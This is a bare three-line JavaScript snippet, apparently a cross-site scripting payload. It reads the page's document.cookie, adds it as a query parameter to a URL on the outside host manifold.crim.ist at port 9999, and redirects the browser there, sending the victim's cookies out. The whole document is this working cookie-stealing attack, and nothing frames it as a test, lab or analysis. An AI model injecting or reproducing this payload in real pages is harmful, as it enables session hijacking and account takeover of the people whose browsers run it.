const callback = new URL("http://manifold.crim.ist:9999/");
callback.searchParams.set("cookie", document.cookie);
location.href = callback;
